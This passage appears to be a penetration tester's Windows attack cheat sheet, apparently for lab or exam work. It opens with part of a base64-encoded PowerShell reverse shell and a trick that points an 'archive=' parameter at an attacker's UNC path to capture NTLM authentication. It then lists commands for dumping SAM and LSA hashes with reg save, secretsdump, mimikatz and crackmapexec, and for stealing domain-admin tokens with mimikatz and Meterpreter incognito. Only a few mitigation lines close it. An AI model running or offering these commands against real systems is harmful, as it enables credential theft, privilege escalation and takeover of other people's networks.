HMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


Try intercepting archive POST request and modified archive= parameter to \\192.168.119.x\test
```

## SAM / System Files
```
reg save hklm\sam C:\Users\Public\SAM
reg save hklm\SYSTEM C:\Users\Public\SYSTEM

└─$ impacket-secretsdump -system SYSTEM -sam SAM LOCAL
└─$ python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

SAM Dumping
Save SYSTEM hive and SAM in another directory:

reg save HKLM\SAM c:\path\to\SAM
reg save HKLM\SYSTEM c:\path\to\SYSTEM

mimikatz
lsadump::sam /system:c:\path\to\SYSTEM /sam:c:c:\path\to\SAM
or just use : lsadump::sam

Notes : you can dump SAM and LSA with crackmapexec or secretdump using these commands :
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
crackmapexec smb $ip -d $domain -u $user -p $password --sam/--lsa

Systemroot can be windows:
%SYSTEMROOT%\repair\SAM
windows\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM

System file can be found here:
SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system
```

## Token Impersonation
```
https://adsecurity.org/?page_id=1821#TOKENElevate https://steflan-security.com/linux-privilege-escalation-token-impersonation/

Whenever a user logs in a machine, windows create a token called delegate token and injects into session. If we have got any access of the machine,we can steal the token and impersonate as that user. If a domain admin logs in the machine,then his token is also available and we can simply impersonate as domain admin using that token. We can then dump ntds.dit and own the domain.

Advice : move from machine to machine and try to find domainadmins token for a easy final win. Try this attack in every machine we get access to

NOTE:Local admin required

Note : If we are administrator or similiar privileges but we are getting error on running mimikatz , list down the process and migrate to a process running as administrator . Same goes for if we are system but our process might be in administrator contex

Using Mimikatz
run mimikatz
    run this command
    token::elevate (impersonate local admin)

or
    token::elevate /domainadmin (impersonate domain admin)

    Now run
    token::run /process:cmd.exe

    Optional commands

    ts::sessions (active sessions)

    token::whoami (current user context)

    token::list (see all available tokens)

    token::revert (revert the token)

Meterpreter
assume we have a meterpreter shell on target(we can use psexec module to get meterpreter session)

    now run
    load incognito
    now run
    list_tokens -u

3.Now we choose any user whos token available and impersonate
    impersonate_token domain\username

Mitigations:

    Domain admins only access domain controllers,limiting attackers attack surface
    Limit Local Admin restriction
    Local Admin passwords must be complex and not same across the network
```



























